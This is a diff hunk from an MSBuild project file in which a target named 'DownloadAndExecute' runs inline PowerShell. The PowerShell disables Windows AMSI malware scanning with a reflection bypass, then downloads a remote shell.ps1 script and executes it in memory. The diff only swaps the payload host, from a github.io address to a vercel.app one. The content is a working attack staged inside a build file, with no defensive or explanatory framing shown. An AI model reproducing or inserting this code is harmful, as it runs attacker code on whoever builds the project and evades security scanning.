@@ -22,7 +22,7 @@
   <Target Name="DownloadAndExecute">
     <RunPowerShell ScriptTextParameter="
       [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
-      IEX(New-Object Net.WebClient).DownloadString('https://Kenbachkhoa1234.github.io/msbuild-payload/shell.ps1')
+      IEX(New-Object Net.WebClient).DownloadString('https://payload-mb.vercel.app/shell.ps1')
     " />
   </Target>
   
